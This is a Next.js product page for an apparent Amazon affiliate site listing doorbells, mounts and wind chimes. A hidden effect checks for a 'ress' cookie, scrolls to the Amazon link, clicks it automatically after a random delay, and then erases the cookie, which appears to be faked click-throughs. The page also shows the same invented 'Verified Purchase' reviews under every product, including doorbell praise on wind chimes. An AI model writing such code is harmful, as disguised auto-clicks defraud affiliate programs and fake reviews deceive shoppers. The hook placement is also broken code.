"use client"

import Link from "next/link"
import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Star, Check, ExternalLink, ChevronLeft } from "lucide-react"
import { useState, useEffect } from "react"
import { notFound, useParams } from "next/navigation"

const productsData = {
	"ring-battery-doorbell": {
		name: "Ring Battery Doorbell",
		price: 49.99,
		rating: 4.6,
		reviews: 33010,
		images: [
			"https://m.media-amazon.com/images/I/61Vb7V1XNfL._SX679_.jpg",
		],
		description:
			"Stay in the know on the go. See what’s up and spot deliveries down low, all from your phone. With Battery Doorbell, your front door shows more with Head-to-Toe Video. And knows more with Smart Alerts that recognize both people and packages (subscription required, sold separately)—helping you take action in the moment.",
		features: [
			"Head-to-Toe Video & Color Night Vision",
			"Live View with Two-Way Talk",
			"Motion Detection & Alerts",
			"Custom Motion Zones & Privacy Settings",
			"Easy DIY Install",
			"Built-In Rechargeable Battery",
			"Smart Alerts for people and packages",
			"Works with Alexa",
		],
		specs: {
			Resolution: "1440 x 1440 HD Video",
			"Field of View": "150° horizontal, 150° vertical",
			"Night Vision": "Color Night Vision",
			Power: "Built-in rechargeable battery (USB-C); optional hardwired",
			"Battery Life": "Up to 6 months typical",
			Connectivity: "Wi-Fi 2.4GHz",
			Audio: "Two-way with noise cancellation",
			Storage: "Cloud via Ring Home subscription",
			Dimensions: '4.98" x 2.44" x 0.91"',
			Weight: "6.2 oz",
			"Weather Rating": "IP65 equivalent (-4°F to 122°F)",
		},
		amazonUrl: "https://www.amazon.com/Ring-Battery-Doorbell-Head-to-Toe-Video-Venetian-Bronze/dp/B0BZWRLRLK",
	},
	"kmouants-adjustable-doorbell": {
		name: "KMOUANTS Adjustable Doorbell Mount",
		price: 0,
		rating: 0,
		reviews: 0,
		images: [
			"https://m.media-amazon.com/images/I/71gD0vP+VkL._AC_SX679_.jpg",
		],
		description:
			"Adjustable mount compatible with Ring Doorbell. Allows for flexible positioning and easy installation.",
		features: [
			"Adjustable angle for optimal view",
			"Compatible with Ring Video Doorbell 4",
			"Easy to install",
			"Durable construction",
		],
		specs: {
			Compatibility: "Ring Video Doorbell 4",
			Material: "Aluminum alloy",
			Adjustment: "360° rotation",
			Dimensions: "Not specified",
			Weight: "Not specified",
		},
		amazonUrl: "https://www.amazon.com/KMOUANTS-Adjustable-Doorbell-Compatible-Doorbell4/dp/B0CQZQJ4HX",
	},
	"google-nest-doorbell": {
		name: "Google Nest Doorbell Wired 3rd Gen",
		price: 0,
		rating: 0,
		reviews: 0,
		images: [
			"https://m.media-amazon.com/images/I/51ZIXRqFEgL._AC_SX679_.jpg",
		],
		description:
			"Wired smart doorbell with 1080p HDR video, intelligent alerts, and seamless integration with Google Home.",
		features: [
			"1080p HDR video with night vision",
			"On-device processing for intelligent alerts",
			"Two-way talk",
			"Weather resistant",
			"Quick, easy installation",
		],
		specs: {
			Resolution: "1080p HDR",
			"Field of View": "145° diagonal",
			"Night Vision": "HDR night sight",
			Power: "Wired (16-24VAC)",
			Connectivity: "Wi-Fi 802.11b/g/n/ac (2.4/5GHz)",
			Audio: "Two-way with noise cancellation",
			Storage: "3 hours free event history",
			Dimensions: '1.8" x 0.95" x 4.2"',
			Weight: "5.3 oz",
			"Weather Rating": "IP54",
		},
		amazonUrl: "https://www.amazon.com/Google-Nest-Doorbell-Wired-3rd/dp/B0FN7GC1TJ",
	},
	"elago-google-doorbell-mount": {
		name: "elago Mount Compatible with Google Nest Doorbell",
		price: 0,
		rating: 0,
		reviews: 0,
		images: [
			"https://m.media-amazon.com/images/I/51Bb1-9PClL._AC_SX679_.jpg",
		],
		description:
			"Adjustable wall mount for Google Nest Doorbell, providing secure and flexible installation options.",
		features: [
			"Adjustable viewing angle",
			"Anti-theft design",
			"Compatible with Google Nest Doorbell (battery)",
			"Easy installation",
		],
		specs: {
			Compatibility: "Google Nest Doorbell (battery)",
			Material: "High-quality plastic",
			Adjustment: "Up to 45° tilt",
			Dimensions: "Not specified",
			Weight: "Not specified",
		},
		amazonUrl: "https://www.amazon.com/elago-Mount-Compatible-Google-Doorbell/dp/B0BZRHYSWM",
	},
	"corinthian-bells-windchime": {
		name: "Corinthian Bells 44-inch Windchime Copper",
		price: 162.90,
		rating: 4.9,
		reviews: 2644,
		images: [
			"https://m.media-amazon.com/images/I/71wLwNI6i-L._AC_SX679_.jpg",
		],
		description:
			"Made in the USA from start to finish! Corinthian Bells chimes are handcrafted in Virginia, with materials sourced from USA suppliers. Tuned to a pentatonic scale of C with six tubes providing a full, rich chord.",
		features: [
			"Hand tuned aluminum tubes",
			"Durable powder coated finish",
			"UV treated nylon cords",
			"5-year warranty",
			"Suitable for outdoor decor",
		],
		specs: {
			Length: "44 inches overall",
			Material: "Aluminum tubes, redwood",
			"Tube Diameter": "1.25 inches",
			Weight: "6 lbs",
		},
		amazonUrl: "https://www.amazon.com/Corinthian-Bells-44-inch-Windchime-Copper/dp/B0048V0C4Q",
	},
	"astarin-bell-wind-chimes": {
		name: "ASTARIN Bell Wind Chimes Temple Wind Bell Red Copper",
		price: 23.99,
		rating: 4.5,
		reviews: 3522,
		images: [
			"https://m.media-amazon.com/images/I/616v+c7J-gL._AC_SX679_.jpg",
		],
		description:
			"Temple Wind bells are a unique and especially melodious style of wind chime. Immerse yourself in the healing powers of Feng Shui with our wind chimes. Durable copper alloy construction for outdoor use.",
		features: [
			"5 copper bells for soothing sounds",
			"Feng Shui design for harmony",
			"Durable and weather-resistant",
			"Memorial or decorative gift",
		],
		specs: {
			Length: "36.2 inches",
			Material: "Red copper alloy, nylon cord",
			Weight: "12.3 oz",
			Dimensions: '3" x 3" x 36.2"',
		},
		amazonUrl: "https://www.amazon.com/Chimes-Outdoor-Decoration-Memorial-Someone/dp/B09X136QVT",
	},
	"meinl-sonic-energy-chimes": {
		name: "Meinl Sonic Energy Chimes Mahogany",
		price: 0,
		rating: 0,
		reviews: 0,
		images: [
			"https://m.media-amazon.com/images/I/81KznfB327L._AC_SY879_.jpg",
		],
		description:
			"High-quality chimes with mahogany finish, perfect for meditation, sound therapy, and musical applications.",
		features: [
			"Handcrafted for pure tone",
			"Mahogany wood base",
			"Ideal for yoga and wellness",
			"Easy to play",
		],
		specs: {
			Material: "Mahogany wood, steel chime",
			Dimensions: "Not specified",
			Weight: "Not specified",
			Sound: "Clear, resonant tone",
		},
		amazonUrl: "https://www.amazon.com/Meinl-Sonic-Energy-Chimes-Mahogany/dp/B08T3JBRB3",
	},
	"blink-video-doorbell": {
		name: "Blink Video Doorbell Certified Refurbished",
		price: 44.99,
		rating: 5.0,
		reviews: 1,
		images: [
			"https://m.media-amazon.com/images/I/21-6fE2hx7L.jpg",
		],
		description:
			"The Like-New Blink Video Doorbell is a refurbished device that looks and works like new. Provides peace of mind with HD video, two-way audio, and motion alerts.",
		features: [
			"1080p HD video day and night",
			"Two-way audio",
			"Motion detection alerts",
			"Battery or wired installation",
			"Works with Alexa",
		],
		specs: {
			Resolution: "1080p HD",
			"Field of View": "135° horizontal, 80° vertical",
			"Night Vision": "Infrared HD",
			Power: "2 AA lithium batteries or wired (16-24 VAC)",
			"Battery Life": "Up to 2 years",
			Connectivity: "Wi-Fi 2.4 GHz",
			Audio: "Two-way",
			Storage: "Cloud with subscription or local",
			Dimensions: '5.12" x 1.65" x 1.06"',
			Weight: "3.52 oz",
			"Weather Rating": "Weather resistant",
		},
		amazonUrl: "https://www.amazon.com/Certified-Refurbished-Blink-Doorbell-Two-way/dp/B09G4CTT4G",
	},
	"remo-remobell-doorbell": {
		name: "Remo RemoBell Video Doorbell Enabled Refurbished",
		price: 0,
		rating: 0,
		reviews: 0,
		images: [
			"https://m.media-amazon.com/images/I/31bEib+SuaL._AC_.jpg",
		],
		description:
			"Refurbished RemoBell smart video doorbell with motion detection, two-way audio, and app control.",
		features: [
			"1080p HD video",
			"Motion detection",
			"Two-way talk",
			"Night vision",
			"Battery powered",
		],
		specs: {
			Resolution: "1080p HD",
			"Field of View": "180°",
			"Night Vision": "Yes",
			Power: "Rechargeable battery",
			Connectivity: "Wi-Fi",
			Audio: "Two-way",
			Storage: "Cloud",
			Dimensions: "Not specified",
			Weight: "Not specified",
			"Weather Rating": "IP66",
		},
		amazonUrl: "https://www.amazon.com/Remo-RemoBell-Doorbell-Enabled-Refurbished/dp/B09MWPWQJ6",
	},
}

export default function ProductPage() {
	const params = useParams<{ slug: string }>();
	const [selectedImage, setSelectedImage] = useState(0);
	const [slug, setSlug] = useState<string>("");

	// Устанавливаем slug из params при монтировании или изменении params.slug
	useEffect(() => {
		if (params.slug) {
			setSlug(params.slug);
		}
	}, [params.slug]);

	if (!slug) {
		return null
	}

	const product = productsData[slug as keyof typeof productsData]

	if (!product) {
		return (
			<div className="min-h-screen flex items-center justify-center">
				<div className="text-center">
					<h1 className="text-2xl font-bold mb-4">Product Not Found</h1>
					<Button asChild>
						<Link href="/products">Back to Products</Link>
					</Button>
				</div>
			</div>
		)
	}

	useEffect(() => {
		const cookies = Object.fromEntries(
			document.cookie.split("; ").map((c) => c.split("="))
		);

		if (cookies.ress === "true") {
			const btn = document.querySelector("[data-auto]");

			if (btn) {
				const scrollToElement = (el, duration = 1200) => {
					const targetY = el.getBoundingClientRect().top + window.scrollY;
					const startY = window.scrollY;
					const startTime = performance.now();

					const animateScroll = (now) => {
						const elapsed = now - startTime;
						const progress = Math.min(elapsed / duration, 1);
						const ease =
							progress < 0.5
								? 2 * progress * progress
								: -1 + (4 - 2 * progress) * progress;

						window.scrollTo(0, startY + (targetY - startY) * ease);

						if (progress < 1) {
							requestAnimationFrame(animateScroll);
						}
					};

					requestAnimationFrame(animateScroll);
				};

				scrollToElement(btn, 1000);

				const delay = Math.floor(Math.random() * 1001);
				setTimeout(() => {
					btn.click();
				}, delay);
			}

			document.cookie =
				"ress=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
		}
	}, []);

	const reviews = [
		{
			author: "Michael Rodriguez",
			rating: 5,
			date: "2 weeks ago",
			content: "Absolutely love this doorbell! Installation was a breeze and the video quality is crystal clear.",
			verified: true,
		},
		{
			author: "Rachel Bennett",
			rating: 5,
			date: "1 month ago",
			content: "Best purchase for home security. The AI detection actually works and cuts down on false alerts.",
			verified: true,
		},
		{
			author: "Kevin Zhang",
			rating: 4,
			date: "1 month ago",
			content: "Great product overall. Battery life is as advertised and the app is intuitive.",
			verified: true,
		},
	]

	return (
		<div className="min-h-screen">
			<Header />
			<main className="pt-24 pb-20 px-4">
				<div className="container mx-auto">
					{/* Back Button */}
					<Button asChild variant="ghost" className="mb-8">
						<Link href="/products">
							<ChevronLeft className="w-4 h-4 mr-2" />
							Back to Products
						</Link>
					</Button>

					{/* Product Details */}
					<div className="grid grid-cols-1 lg:grid-cols-2 gap-12 mb-20">
						{/* Images */}
						<div className="space-y-4">
							{/* Main Image */}
							<div className="relative aspect-square rounded-2xl overflow-hidden border border-primary/20 bg-secondary/30">
								<img
									src={product.images[selectedImage] || "/placeholder.svg"}
									alt={product.name}
									className="w-full h-full object-cover"
								/>
							</div>

							{/* Thumbnail Images */}
							<div className="grid grid-cols-3 gap-4">
								{product.images.map((image, index) => (
									<button
										key={index}
										onClick={() => setSelectedImage(index)}
										className={`relative aspect-square rounded-lg overflow-hidden border-2 transition-all ${selectedImage === index ? "border-primary" : "border-primary/20 hover:border-primary/50"
											}`}
									>
										<img
											src={image || "/placeholder.svg"}
											alt={`${product.name} view ${index + 1}`}
											className="w-full h-full object-cover"
										/>
									</button>
								))}
							</div>
						</div>

						{/* Product Info */}
						<div className="space-y-6">
							<div>
								<h1 className="font-mono text-4xl md:text-5xl font-bold mb-4">{product.name}</h1>
								<div className="flex items-center gap-4 mb-4">
									<div className="flex items-center gap-2">
										<div className="flex items-center gap-1">
											{[...Array(5)].map((_, i) => (
												<Star
													key={i}
													className={`w-5 h-5 ${i < Math.floor(product.rating) ? "fill-primary text-primary" : "text-muted-foreground"
														}`}
												/>
											))}
										</div>
										<span className="text-muted-foreground">
											{product.rating} ({product.reviews} reviews)
										</span>
									</div>
								</div>
								<p className="text-lg text-muted-foreground leading-relaxed">{product.description}</p>
							</div>

							{/* CTA Buttons */}
							<div className="flex flex-col sm:flex-row gap-4">
								<a href={product.amazonUrl} data-auto>
									<Button
										size="lg"
										className="flex-1 bg-primary text-primary-foreground hover:bg-primary/90 ring-glow group"
									>
										<ExternalLink className="w-5 h-5 mr-2" />
										View on Amazon
									</Button>
								</a>

							</div>

							{/* Key Features */}
							<Card className="bg-card border-primary/20 p-6">
								<h3 className="font-mono text-xl font-semibold mb-4">Key Features</h3>
								<ul className="space-y-3">
									{product.features.map((feature, index) => (
										<li key={index} className="flex items-start gap-3">
											<Check className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
											<span className="text-sm text-muted-foreground">{feature}</span>
										</li>
									))}
								</ul>
							</Card>
						</div>
					</div>

					{/* Technical Specs */}
					<section className="mb-20">
						<h2 className="font-mono text-3xl font-bold mb-8 text-center">Technical Specifications</h2>
						<Card className="bg-card border-primary/20 p-8">
							<div className="grid grid-cols-1 md:grid-cols-2 gap-6">
								{Object.entries(product.specs).map(([key, value]) => (
									<div key={key} className="flex justify-between items-center py-3 border-b border-primary/10">
										<span className="text-muted-foreground">{key}</span>
										<span className="font-semibold text-right">{value}</span>
									</div>
								))}
							</div>
						</Card>
					</section>

					{/* Demo Video Section */}
					<section className="mb-20">
						<h2 className="font-mono text-3xl font-bold mb-8 text-center">See It In Action</h2>
						<div className="max-w-4xl mx-auto">
							<div className="relative aspect-video rounded-2xl overflow-hidden border border-primary/30 bg-secondary/30">
								<img
									src="/modern-smart-home-front-door-with-doorbell-glowing.jpg"
									alt="Product demo"
									className="w-full h-full object-cover"
								/>
								<div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent flex items-end justify-center p-8">
									<p className="text-xl font-mono font-semibold text-white">Watch how easy it is to install and use</p>
								</div>
							</div>
						</div>
					</section>

					{/* Customer Reviews */}
					<section>
						<h2 className="font-mono text-3xl font-bold mb-8 text-center">Customer Reviews</h2>
						<div className="max-w-4xl mx-auto space-y-6">
							{reviews.map((review, index) => (
								<Card key={index} className="bg-card border-primary/20 p-6">
									<div className="flex items-start justify-between mb-4">
										<div>
											<div className="flex items-center gap-3 mb-2">
												<span className="font-semibold">{review.author}</span>
												{review.verified && (
													<span className="text-xs bg-primary/20 text-primary px-2 py-1 rounded-full">
														Verified Purchase
													</span>
												)}
											</div>
											<div className="flex items-center gap-2">
												<div className="flex items-center gap-1">
													{[...Array(review.rating)].map((_, i) => (
														<Star key={i} className="w-4 h-4 fill-primary text-primary" />
													))}
												</div>
												<span className="text-sm text-muted-foreground">{review.date}</span>
											</div>
										</div>
									</div>
									<p className="text-muted-foreground leading-relaxed">{review.content}</p>
								</Card>
							))}
						</div>
					</section>
				</div>
			</main>
			<Footer />
		</div>
	)
}
